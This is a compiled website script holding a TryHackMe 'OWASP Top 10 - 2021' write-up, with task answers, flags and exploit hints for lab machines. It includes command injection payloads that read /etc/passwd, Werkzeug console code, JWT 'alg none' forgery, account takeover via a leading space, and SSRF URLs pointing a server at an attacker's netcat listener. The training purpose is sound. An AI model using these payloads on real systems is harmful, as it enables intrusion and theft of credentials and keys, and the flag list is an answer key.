"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[8881],{3905:(e,t,a)=>{a.d(t,{Zo:()=>u,kt:()=>h});var n=a(7294);function o(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function s(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function l(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?s(Object(a),!0).forEach((function(t){o(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):s(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function r(e,t){if(null==e)return{};var a,n,o=function(e,t){if(null==e)return{};var a,n,o={},s=Object.keys(e);for(n=0;n<s.length;n++)a=s[n],t.indexOf(a)>=0||(o[a]=e[a]);return o}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)a=s[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(o[a]=e[a])}return o}var i=n.createContext({}),p=function(e){var t=n.useContext(i),a=t;return e&&(a="function"==typeof e?e(t):l(l({},t),e)),a},u=function(e){var t=p(e.components);return n.createElement(i.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},k=n.forwardRef((function(e,t){var a=e.components,o=e.mdxType,s=e.originalType,i=e.parentName,u=r(e,["components","mdxType","originalType","parentName"]),c=p(a),k=o,h=c["".concat(i,".").concat(k)]||c[k]||d[k]||s;return a?n.createElement(h,l(l({ref:t},u),{},{components:a})):n.createElement(h,l({ref:t},u))}));function h(e,t){var a=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var s=a.length,l=new Array(s);l[0]=k;var r={};for(var i in t)hasOwnProperty.call(t,i)&&(r[i]=t[i]);r.originalType=e,r[c]="string"==typeof e?e:o,l[1]=r;for(var p=2;p<s;p++)l[p]=a[p];return n.createElement.apply(null,l)}return n.createElement.apply(null,a)}k.displayName="MDXCreateElement"},3081:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>i,contentTitle:()=>l,default:()=>h,frontMatter:()=>s,metadata:()=>r,toc:()=>p});var n=a(7462),o=(a(7294),a(3905));const s={},l="OWASP Top 10 - 2021",r={unversionedId:"writeups/thm/web/owasp-top-10-2021",id:"writeups/thm/web/owasp-top-10-2021",title:"OWASP Top 10 - 2021",description:"Task 1 - Introduction",source:"@site/docs/writeups/thm/web/owasp-top-10-2021.md",sourceDirName:"writeups/thm/web",slug:"/writeups/thm/web/owasp-top-10-2021",permalink:"/docs/writeups/thm/web/owasp-top-10-2021",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/web/owasp-top-10-2021.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"OWASP Juice Shop",permalink:"/docs/writeups/thm/web/owasp-juice-shop"},next:{title:"Walking An Application",permalink:"/docs/writeups/thm/web/walking-an-application"}},i={},p=[{value:"Task 1 - Introduction",id:"task-1---introduction",level:2},{value:"Task 2 - Accessing Machines",id:"task-2---accessing-machines",level:2},{value:"Task 3 - 1. Broken Access Control",id:"task-3---1-broken-access-control",level:2},{value:"Task 4 - Broken Access Control (IDOR Challenge)",id:"task-4---broken-access-control-idor-challenge",level:2},{value:"Task 5 - 2. Cryptographic Failures",id:"task-5---2-cryptographic-failures",level:2},{value:"Task 6 - Cryptographic Failures (Supporting Material 1)",id:"task-6---cryptographic-failures-supporting-material-1",level:2},{value:"Task 7 - Cryptographic Failures (Supporting Material 2)",id:"task-7---cryptographic-failures-supporting-material-2",level:2},{value:"Task 8 - Cryptographic Failures (Challenge)",id:"task-8---cryptographic-failures-challenge",level:2},{value:"Task 9 - 3. Injection",id:"task-9---3-injection",level:2},{value:"Task 10 - 3.1. Command Injection",id:"task-10---31-command-injection",level:2},{value:"Task 11 - 4. Insecure Design",id:"task-11---4-insecure-design",level:2},{value:"Task 12 - 5. Security Misconfiguration",id:"task-12---5-security-misconfiguration",level:2},{value:"Task 13 - 6. Vulnerable and Outdated Components",id:"task-13---6-vulnerable-and-outdated-components",level:2},{value:"Task 14 - Vulnerable and Outdated Components - Exploit",id:"task-14---vulnerable-and-outdated-components---exploit",level:2},{value:"Task 15 - Vulnerable and Outdated Components - Lab",id:"task-15---vulnerable-and-outdated-components---lab",level:2},{value:"Task 16 - 7. Identification and Authentication Failures",id:"task-16---7-identification-and-authentication-failures",level:2},{value:"Task 17 - Identification and Authentication Failures Practical",id:"task-17---identification-and-authentication-failures-practical",level:2},{value:"Task 18 - 8. Software and Data Integrity Failures",id:"task-18---8-software-and-data-integrity-failures",level:2},{value:"Task 19 - Software Integrity Failures",id:"task-19---software-integrity-failures",level:2},{value:"Task 20 - Data Integrity Failures",id:"task-20---data-integrity-failures",level:2},{value:"Task 21 - 9. Security Logging and Monitoring Failures",id:"task-21---9-security-logging-and-monitoring-failures",level:2},{value:"Task 22 - 10. Server-Side Request Forgery (SSRF)",id:"task-22---10-server-side-request-forgery-ssrf",level:2},{value:"Task 23 - What Next?",id:"task-23---what-next",level:2}],u=(c="Image",function(e){return console.warn("Component "+c+" was not imported, exported, or provided by MDXProvider as global scope"),(0,o.kt)("div",e)});var c;const d={toc:p},k="wrapper";function h(e){let{components:t,...s}=e;return(0,o.kt)(k,(0,n.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"owasp-top-10---2021"},"OWASP Top 10 - 2021"),(0,o.kt)(u,{src:"https://tryhackme-images.s3.amazonaws.com/room-icons/3b2f3af8e836785fe698356264efbb55.png",width:"128px",mdxType:"Image"}),(0,o.kt)("h2",{id:"task-1---introduction"},"Task 1 - Introduction"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the above.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-2---accessing-machines"},"Task 2 - Accessing Machines"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Connect to our network or deploy the AttackBox.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-3---1-broken-access-control"},"Task 3 - 1. Broken Access Control"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read and understand what broken access control is.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-4---broken-access-control-idor-challenge"},"Task 4 - Broken Access Control (IDOR Challenge)"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read and understand how IDOR works.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Deploy the machine and go to URL - Login with the username noot and the password test1234.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Look at other users' notes. What is the flag?")),(0,o.kt)("p",null,"flag{fivefourthree}"),(0,o.kt)("p",null,"There is an IDOR vuln in the note id. New notes start from 3. It is possible to read also note 1 and note 2."),(0,o.kt)("h2",{id:"task-5---2-cryptographic-failures"},"Task 5 - 2. Cryptographic Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the introduction to Cryptographic Failures and deploy the machine.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-6---cryptographic-failures-supporting-material-1"},"Task 6 - Cryptographic Failures (Supporting Material 1)"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read and understand the supporting material on SQLite Databases.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-7---cryptographic-failures-supporting-material-2"},"Task 7 - Cryptographic Failures (Supporting Material 2)"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the supporting material about cracking hashes.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-8---cryptographic-failures-challenge"},"Task 8 - Cryptographic Failures (Challenge)"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the name of the mentioned directory?")),(0,o.kt)("p",null,"/assets"),(0,o.kt)("p",null,"By looking to the image in the homepage it is possible to identify a path traversal vulnerability over the ",(0,o.kt)("inlineCode",{parentName:"p"},"/assets")," path."),(0,o.kt)(u,{src:a(7966).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?")),(0,o.kt)("p",null,"webapp.db"),(0,o.kt)("p",null,"Inside the ",(0,o.kt)("inlineCode",{parentName:"p"},"/assets")," folder there is a sqlite db that can be downloaded."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Use the supporting material to access the sensitive data. What is the password hash of the admin user?")),(0,o.kt)("p",null,"6eea9b7ef19179a06954edd0f6c05ceb"),(0,o.kt)("p",null,"To get the password of the admin user it is enough to open the database using sqlite3 cli tool."),(0,o.kt)("p",null,"Be careful, the password hash is in the third column not the first."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sqlite3 webapp.db\n.tables\nPRAGMA table_info(users);\nSELECT * from users;\n")),(0,o.kt)(u,{src:a(5138).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Crack the hash.\nWhat is the admin's plaintext password?")),(0,o.kt)("p",null,"qwertyuiop"),(0,o.kt)("p",null,"To decrypt the hash it is possible to use ",(0,o.kt)("a",{parentName:"p",href:"https://crackstation.net/"},"https://crackstation.net/"),"."),(0,o.kt)(u,{src:a(1247).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Log in as the admin. What is the flag?")),(0,o.kt)("p",null,"THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}"),(0,o.kt)(u,{src:a(3744).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-9---3-injection"},"Task 9 - 3. Injection"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"I've understood Injection attacks.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-10---31-command-injection"},"Task 10 - 3.1. Command Injection"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What strange text file is in the website's root directory?")),(0,o.kt)("p",null,"drpepper.txt"),(0,o.kt)("p",null,"Run ",(0,o.kt)("inlineCode",{parentName:"p"},"$(ls)")," to show the files."),(0,o.kt)(u,{src:a(4021).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"How many non-root/non-service/non-daemon users are there?")),(0,o.kt)("p",null,"0"),(0,o.kt)("p",null,"Run ",(0,o.kt)("inlineCode",{parentName:"p"},"$(id)")," to show user information for the current user. The users required must have id greater than 1000."),(0,o.kt)(u,{src:a(8786).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What user is this app running as?")),(0,o.kt)("p",null,"apache"),(0,o.kt)("p",null,"Run ",(0,o.kt)("inlineCode",{parentName:"p"},"$(whoami)")," to find who is running the app."),(0,o.kt)(u,{src:a(2085).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the user's shell set as?")),(0,o.kt)("p",null,"/sbin/nologin"),(0,o.kt)("p",null,"Run ",(0,o.kt)("inlineCode",{parentName:"p"},"$(cat /etc/passwd | grep apache)")," to find the shell as the last part of the line."),(0,o.kt)(u,{src:a(1603).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What version of Alpine Linux is running?")),(0,o.kt)("p",null,"3.16.0"),(0,o.kt)("p",null,"Run ",(0,o.kt)("inlineCode",{parentName:"p"},"$(cat /etc/alpine-release)")," to find the version of Alpine that the app is running."),(0,o.kt)(u,{src:a(9553).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-11---4-insecure-design"},"Task 11 - 4. Insecure Design"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the value of the flag in joseph's account?")),(0,o.kt)("p",null,"THM{Not_3ven_c4tz_c0uld_sav3_U!}"),(0,o.kt)("p",null,"The reset password is based on three security questions. One of them asks about the favorite color. It is easy to try common english color names to find the answer ",(0,o.kt)("inlineCode",{parentName:"p"},"green"),"."),(0,o.kt)(u,{src:a(4347).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-12---5-security-misconfiguration"},"Task 12 - 5. Security Misconfiguration"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Navigate to ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.2.211:86/console"},"http://10.10.2.211:86/console")," to access the Werkzeug console.\nWhat is the database file name (the one with the .db extension) in the current directory?")),(0,o.kt)("p",null,"todo.db"),(0,o.kt)("p",null,"Use the given command to see the content of the current directory."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'import os; print(os.popen("ls -l").read())\n')),(0,o.kt)(u,{src:a(2778).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?")),(0,o.kt)("p",null,"THM{Just_a_tiny_misconfiguration}"),(0,o.kt)("p",null,"Change the given code to read the app.py file using the cat command."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'import os; print(os.popen("cat app.py").read())\n')),(0,o.kt)(u,{src:a(8236).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-13---6-vulnerable-and-outdated-components"},"Task 13 - 6. Vulnerable and Outdated Components"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read about the vulnerability.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-14---vulnerable-and-outdated-components---exploit"},"Task 14 - Vulnerable and Outdated Components - Exploit"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the above!")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-15---vulnerable-and-outdated-components---lab"},"Task 15 - Vulnerable and Outdated Components - Lab"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the content of the /opt/flag.txt file?")),(0,o.kt)("p",null,"THM{But_1ts_n0t_my_f4ult!}"),(0,o.kt)("p",null,"Search on Google for ",(0,o.kt)("inlineCode",{parentName:"p"},"CSE Bookstore vuln")," to find a working script on exploit-db."),(0,o.kt)(u,{src:a(602).Z,mdxType:"Image"}),(0,o.kt)(u,{src:a(5043).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-16---7-identification-and-authentication-failures"},"Task 16 - 7. Identification and Authentication Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"I've understood broken authentication mechanisms.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-17---identification-and-authentication-failures-practical"},"Task 17 - Identification and Authentication Failures Practical"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the flag that you found in darren's account?")),(0,o.kt)("p",null,"fe86079416a21a3c99937fea8874b667"),(0,o.kt)("p",null,"Register as ",(0,o.kt)("inlineCode",{parentName:"p"}," darren")," with the additional space at the beginning of the username. Now, try to log in as ",(0,o.kt)("inlineCode",{parentName:"p"}," darren")," and you will be logged in as ",(0,o.kt)("inlineCode",{parentName:"p"},"darren"),"."),(0,o.kt)(u,{src:a(4368).Z,mdxType:"Image"}),(0,o.kt)(u,{src:a(2213).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Now try to do the same trick and see if you can log in as arthur.")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the flag that you found in arthur's account?")),(0,o.kt)("p",null,"d9ac0f7db4fda460ac3edeb75d75e16e"),(0,o.kt)("p",null,"Register again as for darren but this time as ",(0,o.kt)("inlineCode",{parentName:"p"}," arthur")," and log in."),(0,o.kt)(u,{src:a(3217).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-18---8-software-and-data-integrity-failures"},"Task 18 - 8. Software and Data Integrity Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the above and continue!")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("h2",{id:"task-19---software-integrity-failures"},"Task 19 - Software Integrity Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the SHA-256 hash of ",(0,o.kt)("inlineCode",{parentName:"p"},"https://code.jquery.com/jquery-1.12.4.min.js"),"?")),(0,o.kt)("p",null,"sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ="),(0,o.kt)("p",null,"Go to ",(0,o.kt)("a",{parentName:"p",href:"https://www.srihash.org/"},"https://www.srihash.org/")," and insert the given text.\nBe careful to change the option to ",(0,o.kt)("inlineCode",{parentName:"p"},"sha256"),"."),(0,o.kt)("h2",{id:"task-20---data-integrity-failures"},"Task 20 - Data Integrity Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Try logging into the application as guest. What is guest's account password?")),(0,o.kt)("p",null,"guest"),(0,o.kt)("p",null,"If you write a wrong password, a message will appear specifying the default credentials for the guest account."),(0,o.kt)(u,{src:a(6045).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the name of the website's cookie containing a JWT token?")),(0,o.kt)("p",null,"jwt-session"),(0,o.kt)("p",null,"Open the dev tools after the login and look in storage. You should find a cookie with a jwt token."),(0,o.kt)(u,{src:a(6599).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},'Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".')),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What is the flag presented to the admin user?")),(0,o.kt)("p",null,"THM{Dont_take_cookies_from_strangers}"),(0,o.kt)("p",null,"Use a jwt editor and change alg to none and the username to admin. Be careful to remove the signature but keep the dot."),(0,o.kt)("h2",{id:"task-21---9-security-logging-and-monitoring-failures"},"Task 21 - 9. Security Logging and Monitoring Failures"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What IP address is the attacker using?")),(0,o.kt)("p",null,"49.99.13.16"),(0,o.kt)("p",null,"The attacker is doing a brute force attack on the login page. You can see the multiple attempts with different usernames."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"What kind of attack is being carried out?")),(0,o.kt)("p",null,"Brute Force"),(0,o.kt)("p",null,"Look the previous answer."),(0,o.kt)(u,{src:a(3345).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-22---10-server-side-request-forgery-ssrf"},"Task 22 - 10. Server-Side Request Forgery (SSRF)"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Explore the website. What is the only host allowed to access the admin area?")),(0,o.kt)("p",null,"localhost"),(0,o.kt)(u,{src:a(9400).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},'Check the "Download Resume" button. Where does the server parameter point to?')),(0,o.kt)("p",null,"secure-file-storage.com"),(0,o.kt)("p",null,"Go hover the button and you will see the link. Also, you can see the link in the source code or with right click and then copy link address."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/download?server=secure-file-storage.com:8087&id=75482342\n")),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?")),(0,o.kt)("p",null,"THM{Hello_Im_just_an_API_key}"),(0,o.kt)("p",null,"Make your host listen with netcat and then change the link so that it points to your machine.\nThe flag will be shown in the terminal."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/download?server=IP:PORT&id=75482342\n")),(0,o.kt)(u,{src:a(2777).Z,mdxType:"Image"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"[Optional]"," There's a way to use SSRF to gain access to the site's admin area. Can you find it?")),(0,o.kt)("p",null,"No answer needed"),(0,o.kt)("p",null,"[Optional]"," thm{c4n_i_haz_flagz_plz?}"),(0,o.kt)("p",null,"The flag can be obtain by making a SSRF to the admin page by paying attention to the url."),(0,o.kt)("p",null,"Whatever you put as server will be then updated with additional text at the end."),(0,o.kt)("p",null,"To avoid this problem add ",(0,o.kt)("inlineCode",{parentName:"p"},"?x=")," at the end of the url to avoid the additional text."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"/download?server=localhost:PORT/admin?x=&id=75482342\n")),(0,o.kt)(u,{src:a(5262).Z,mdxType:"Image"}),(0,o.kt)("h2",{id:"task-23---what-next"},"Task 23 - What Next?"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Read the above!")),(0,o.kt)("p",null,"No answer needed"))}h.isMDXComponent=!0},9400:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/admin-area-7fa766c4e09310ed853cd307d459000c.png"},3744:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/admin-cd52d092d18136acde4994bcd69f62e7.png"},3217:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/arthur-4210203fd94606141bcdad08d29d4285.png"},7966:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/assets-270dd2d69d2a2f3e8ddc9c150dd6ee80.png"},6045:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/cookie-2bebb73d4ac8602a314d46b645a22661.png"},1247:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/crackstation-9c8d63ca7a43441f00c3721d341f8794.png"},5043:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/cse_flag-279eb40fa128bf8e1be53bf073ee0c8b.png"},602:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/cse_vuln-7c6f1a16be1eee9ae6ca3b6ce7b33e6a.png"},2213:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/darren-6e70cab7c0720c9d3994952478a94a8f.png"},4368:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/darren_register-71b8d9a6be38474dba7cb49e0262bde2.png"},8786:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/id-513a95cead8390250e628173a8021788.png"},6599:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/jwt-d7f7f6cfdf51d478ad7d11e07d378742.png"},3345:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/logs-6945e7e08e435e44b1e42f0c52677a38.png"},4021:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/ls-f05f5ca747c26ce33acadb96e6a50002.png"},2777:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/nc-c413d9a4d054060f1f64f9c3d2803cff.png"},5262:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/optional-flag-4c8feca8002f4b6e146fa0fa2da6ebc6.png"},4347:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/reset_password-d16a307f41f16238cc501788c2aa9dcb.png"},1603:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/shell-69f391cbd5d3b7f3b618c954bbd8a614.png"},5138:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/sqlite-b6b3e7604033801748aaaa2a52f89d70.png"},9553:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/version-34e0c1f46afd5e14bc615615fb65aa40.png"},8236:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/werkzeug_code-e6faea9b485f74b75fb7644ceaacf973.png"},2778:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/werkzeug_db-d26fd61e546db9f6db0ebcee9e97fb67.png"},2085:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/whoami-ca001c4555e9e180d75f5e5655b7de64.png"}}]);